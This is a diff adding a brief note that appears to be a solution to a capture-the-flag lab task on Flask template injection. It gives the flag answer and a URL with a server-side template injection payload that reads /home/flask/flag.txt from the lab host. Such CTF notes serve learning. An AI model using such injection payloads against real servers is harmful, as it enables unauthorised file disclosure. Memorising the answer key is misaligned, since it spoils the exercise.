@@ -1,0 +1,7 @@
+
+															Task 6 Flask Injection
+														------------------------------
+
+1. What's inside /home/flask/flag.txt ? 
+ans: THM{flask_1njected}
+url : http://10.10.148.33:5000/vuln?name={{get_user_file(/home/flask/flag.txt)}}
